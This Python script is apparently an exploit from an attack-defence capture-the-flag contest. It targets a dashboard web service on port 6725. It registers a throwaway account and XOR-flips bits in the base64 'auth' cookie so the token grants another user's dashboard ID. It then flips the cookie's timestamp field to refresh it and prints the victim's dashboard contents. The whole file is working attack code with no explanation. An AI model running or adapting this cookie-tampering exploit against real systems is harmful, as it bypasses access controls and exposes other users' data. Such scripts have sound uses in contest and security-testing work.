#!/usr/bin/python3

import sys
import requests
import base64
import random
import string
import re
import urllib
import struct
import math
import time
import datetime

def get_rand_string(l):
	return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))

def unsigned(n):
	if n < 0:
		n = n + 2 ** 32
	return n

def dt2ts(dt):
	msPerDay = 24 * 60 * 60 * 1000;
	t = dt * msPerDay
#	if t < 0:
#		t -= 0.5
#	else:
#		t += 0.5
	tt = abs(math.trunc(t)) % msPerDay
	td = 693594 + math.trunc(t) // msPerDay
	return (unsigned(td), unsigned(tt))

def uts2dt(uts):
	return uts / 86400 + 25569.0;

hostname, dashboard = sys.argv[1:]

host = 'http://{}:{}/'.format(hostname, 6725)

session = requests.Session()

user, password = get_rand_string(8), get_rand_string(16)
session.post(host + 'user/register', data={'username': user, 'password': password})

name, desc = get_rand_string(8), get_rand_string(16)
response = session.post(host + 'dashboard/create', data={'name': name, 'description': desc})

getDashboardId = re.compile('dashboardId=(\d+)', re.IGNORECASE)
m = getDashboardId.search(response.url)

actual = int(m.group(1))
expected = int(dashboard)

diff = actual ^ expected

cookie = urllib.parse.unquote(session.cookies['auth'])
token = base64.b64decode(cookie) 

data = list(struct.unpack('<QQQQ', token))
data[2] ^= diff

token = struct.pack('<QQQQ', data[0], data[1], data[2], data[3])
session.cookies.clear()
session.cookies['auth'] = urllib.parse.quote(base64.b64encode(token).decode())

url = host + 'dashboard/view?dashboardId=' + dashboard
response = session.get(url)

#print(response.text)

getTime = re.compile('(-?\d+\.\d+)', re.IGNORECASE)
m = getTime.search(response.text)

fpdate = float(m.group(1))
#print(fpdate)
aday, atime = dt2ts(fpdate)
a = (atime << 32) | aday
#print(aday, atime)

nday, ntime = dt2ts(uts2dt(time.time() + 5*60*60))
n = (ntime << 32) | nday
print(nday, ntime)

diff = a ^ n
data[1] ^= diff

token = struct.pack('<QQQQ', data[0], data[1], data[2], data[3])
session.cookies.clear()
session.cookies['auth'] = urllib.parse.quote(base64.b64encode(token).decode())

url = host + 'dashboard/view?dashboardId=' + dashboard
response = session.get(url)

print(response.text)
